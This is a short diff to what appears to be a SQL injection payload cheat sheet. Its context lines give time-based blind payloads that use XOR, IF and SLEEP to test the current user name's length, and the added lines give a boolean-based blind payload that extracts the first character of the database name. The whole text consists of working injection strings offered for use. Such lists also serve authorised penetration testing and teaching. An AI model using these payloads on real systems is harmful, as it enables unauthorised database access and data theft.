@@ -107,3 +107,7 @@ latest:
 # This payload will check if the user name legth is greater than 20 server will sleep for 3 seconds , else it wont sleep, change the value accordingly
 'XOR(IF(length(user())>20,SLEEP(3),0))XOR'
 'XOR(IF(length(user())>20,SLEEP(3),0))XOR'Z--%20-+
+
+# Boolean based blind payload, this payload will check the first name of database
+
+' or (ascii(substr((select+database()),1,1))) ='1
